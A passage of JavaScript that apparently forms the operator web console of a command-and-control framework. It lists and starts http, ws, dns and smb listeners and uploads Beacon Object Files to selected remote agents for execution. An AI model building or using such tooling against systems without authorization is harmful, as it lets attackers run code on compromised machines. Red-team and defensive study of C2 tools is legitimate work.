            var rows = await api('GET', '/listeners');
            var box = document.getElementById('listener-list');
            if (!rows || !rows.length) { box.textContent = 'No listeners'; return; }
            box.innerHTML = rows.map(function(l) {
                return '<span class="listener-chip">' + escapeHtml(l.type) + ' ' + escapeHtml(String(l.host)) + ':' + l.port + '</span>';
            }).join('');
        } catch (e) {}
    }
    document.getElementById('bof-file').addEventListener('change', function(e) {
        var file = e.target.files && e.target.files[0];
        e.target.value = '';
        if (!file || !selectedAgentId) return;
        var reader = new FileReader();
        reader.onload = async function() {
            var b64 = String(reader.result).split(',')[1] || '';
            var result = await api('POST', '/agents/' + selectedAgentId + '/bof', { bof_data: b64, args: '', entry: 'go' });
            addEventLog('bof', selectedAgentId + ': ' + (result.output || 'queued'));
        };
        reader.readAsDataURL(file);
    });
    document.getElementById('btn-listener').addEventListener('click', async function() {
        var type = prompt('Listener type: http, ws, dns, smb', 'http');
        if (!type) return;
        var port = prompt('Port', type === 'dns' ? '5353' : type === 'smb' ? '4455' : '8080');
        if (!port) return;
        var result = await api('POST', '/listeners', { type: type, port: parseInt(port, 10) });
        addEventLog('listener_started', JSON.stringify(result));
        loadListeners();
    });
    loadListeners();

    // --- Auto-refresh agents every 5s ---
    setInterval(refreshAgents, 5000);

})();
